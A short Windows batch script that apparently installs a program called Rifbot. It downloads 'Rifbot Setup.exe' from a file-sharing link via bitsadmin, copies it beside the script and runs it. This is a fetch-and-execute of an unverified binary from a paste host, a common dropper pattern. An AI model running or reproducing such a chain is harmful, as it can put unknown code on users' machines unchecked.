bitsadmin.exe /transfer "Downloading Ribot please wait.." https://www.easypaste.org/file/download/B7oYnmKzvSNlFpUTfZe2?lang=pl "C:\Downloads\Rifbot Setup.exe"
echo f | xcopy /f /y "C:\Downloads\Rifbot Setup.exe" "%~dp0Rifbot Setup.exe"
start "" "Rifbot Setup.exe"
